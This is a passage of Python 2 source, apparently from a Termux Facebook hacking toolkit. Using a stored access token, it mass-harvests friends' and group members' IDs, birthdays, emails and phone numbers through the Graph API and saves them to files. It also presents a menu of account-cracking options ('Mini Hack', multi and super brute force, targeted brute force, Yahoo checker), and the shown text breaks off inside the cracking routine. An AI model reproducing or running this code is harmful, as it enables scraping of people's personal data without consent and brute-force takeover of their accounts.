    print 48 * (('{}─{}').format(black, finished))
    def main(arg):
        user = arg
        uid, nama = user.split('|')
        try:
            q = requests.get('https://graph.facebook.com/' + uid + '?access_token=' + token, headers=header).text
            d = json.loads(q)
            y = d['birthday']
            print (('{} ' + uid + ' {}| ' + '{}' + nama + ' {}| ' + y + '{}').format(green, black, whitelite, black, finished))
            sys.stdout.flush()
            time.sleep(0.005)
            bz = open('/sdcard/HTTPNET/INBL_friends.txt', 'a')
            bz.write(uid + ' | ' + nama + ' | ' + y + '\n')
            print '\r\x1b[0;97m[\x1b[0;95m' + str(len(nama)) + '\x1b[0;97m]\x1b[0;90m =>',
            bz.close()
            nama.append(number)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print 48 * (('{}─{}').format(black, finished))
    print (('\r{}[{}✓{}] {}Getting id finished{}...{}').format(red, green, red, white, black, finished))
    print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(id) + '{}' ).format(red, green, red, white, red, yellow, finished))
    print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
    print 48 * (('{}─{}').format(black, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    dump_inbf()
    #Function_The_End
def id_friend():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        clr()
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan (('              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/ids_frind.txt', 'w')
        for a in z['data']:
            idfriend.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m[\x1b[0;95m' + str(len(idfriend)) + '\x1b[0;97m]\x1b[0;90m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            bz = open('/sdcard/HTTPNET/ids_frind.txt', 'a')
            print (('{}' + a['id'] + ' {}| {}' + a['name'] + '{}').format(green, black, white, finished))
        bz.close()
        print 48 * (('{}─{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting id finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(idfriend) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def idfrom_friend():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        clr()
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        idt = raw_input (('{}[{}+{}] {}Input friend/Id {}: {}').format(red, green, red, white, red, green))
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print (('{}[{}✓{}] {}Profile Name {}: {}' + op['name'] + '{}').format(red, green, red, white, red, green, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan (('{}[{}✺{}] {}Getting all friend ids of friends{}...{}').format(red, green, red, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/ids_frindlist.txt', 'w')
        for a in z['friends']['data']:
            idfromfriend.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromfriend)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.005)
            bz = open('/sdcard/HTTPNET/ids_frindlist.txt', 'a')
        bz.close()
        print (('\r{}[{}✓{}] {}Getting id finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(idfromfriend) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def grupsaya():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    try:
        uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
        gud = json.loads(uh.text)
        jalan (('{}[{}✺{}] {}Getting all your joined ids of groups{}...{}').format(red, green, red, white, black, finished))
        jalan (('\n              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for p in gud['data']:
            nama = p['name']
            id = p['id']
            bz = open('/sdcard/HTTPNET/Grupid.txt', 'w')
            listgrup.append(id)
            bz.write(id + ' | ' + nama + '\n')
            print (('{}[ {}My Group{} ] {}' + str(id) + ' {}| {}' + str(nama) + '{}').format(red, green, red, white, red, whitelite, finished))
            sys.stdout.flush()
            time.sleep(0.005)
            bz = open('/sdcard/HTTPNET/Grupid.txt', 'a')
        bz.close()
        print 48 * (('{}─{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting id finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(listgrup) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
        #Function_The_End
def id_member_grup():
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        id = raw_input (('{}[{}+{}] {}Input group/id {}: {}').format(red, green, red, green, red, finished))
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        jalan (('{}[{}✺{}] {}Getting all group members id{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/members_id.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=5000&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            idmem.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
            bz = open('/sdcard/HTTPNET/members_id.txt', 'a')
        bz.close()
        print (('\r{}[{}✓{}] {}Getting id finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(idmem) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def em_member_grup():
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        id = raw_input (('{}[{}+{}] {}Input group/id {}: {}').format(red, green, red, green, red, finished))
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        jalan (('{}[{}✺{}] {}Getting all group members email{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/members_email.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                emmem.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/members_email.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting email finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(emmem) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def no_member_grup():
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        id = raw_input (('{}[{}+{}] {}Input group/id {}: {}').format(red, green, red, green, red, finished))
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        jalan (('{}[{}✺{}] {}Getting all group members number{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/members_number.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                nomem.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(nomem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/members_number.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting number finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(nomem) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def email():
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan (('              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/email_friend.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                em.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(em)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/email_friend.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting email finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(em) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def emailfrom_friend():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        idt = raw_input (('{}[{}+{}] {}Input friend/Id {}: {}').format(red, green, red, white, red, green))
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print (('{}[{}✓{}] {}Profile Name {}: {}' + op['name'] + '{}').format(red, green, red, white, red, green, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan (('{}[{}✺{}] {}Getting all friend email of friends{}...{}').format(red, green, red, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/email_friendlist.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                emfromfriend.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emfromfriend)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/email_friendlist.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting email finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(emfromfriend) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def nomor_hp():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        jalan (('              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        url = 'https://graph.facebook.com/me/friends?access_token=' + toket
        r = requests.get(url)
        z = json.loads(r.text)
        bz = open('/sdcard/HTTPNET/numbers_friend.txt', 'w')
        for n in z['data']:
            x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                hp.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(hp)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/numbers_friend.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting number finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(hp) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def hpfrom_friend():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        os.system('clear')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        idt = raw_input (('{}[{}+{}] {}Input friend/Id {}: {}').format(red, green, red, white, red, green))
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print (('{}[{}✓{}] {}Profile Name {}: {}' + op['name'] + '{}').format(red, green, red, white, red, green, finished))
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            dump()
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan (('{}[{}✺{}] {}Getting all friend number of friends{}...{}').format(red, green, red, white, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        bz = open('/sdcard/HTTPNET/numbers_friendlist.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                hpfromfriend.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(hpfromfriend)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
                bz = open('/sdcard/HTTPNET/numbers_friendlist.txt', 'a')
            except KeyError:
                pass
        bz.close()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}✓{}] {}Getting number finished{}...{}').format(red, green, red, white, black, finished))
        print (('\r{}[{}+{}] {}Total ID  {}: {}%s' % len(hpfromfriend) + '{}' ).format(red, green, red, white, red, yellow, finished))
        print (('\r{}[{}+{}] {}File save {}: {}Successful{}').format(red, green, red, white, red, green, finished))
        print 48 * (('{}─{}').format(black, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except (KeyboardInterrupt, EOFError):
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        dump()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
        #Function_The_End
def menu_hack():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Mini Hack Facebook({}Target{}){}').format(yellow, blue, yellow, white, green, white, finished))
    print (('{}[{}02{}] {}Multi Bruteforce Facebook{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Super Multi Bruteforce Facebook{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}BruteForce({}Target{}){}').format(yellow, blue, yellow, white, green, white, finished))
    print (('{}[{}05{}] {}Yahoo Checker{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    hack_pilih()
def hack_pilih():
    array3 = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if array3 == '1' or array3 == '01':
        mini()
    elif array3 == '2' or array3 == '02':
        crack()
        hasil()
    elif array3 == '3' or array3 == '03':
        super()
    elif array3 == '4' or array3 == '04':
        brute()
    elif array3 == '5' or array3 == '05':
        menu_yahoo()
    elif array3 == '0' or array3 == '00':
        menu()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        menu_hack()
def mini():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}INFO{}] {}Target account must be friend\n       with your account first{}!{}').format(red, green, red, white, red, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    try:
        id = raw_input(('{}[{}+{}] {}Target ID {}: {}').format(red, green, red, white, red, green))
        r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        a = json.loads(r.text)
        print (('{}[{}➹{}] {}FB Name {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
        jalan(('{}[{}*{}] {}Cracking{}...{}').format(red, green, red, white, black, finished))
        time.sleep(2)
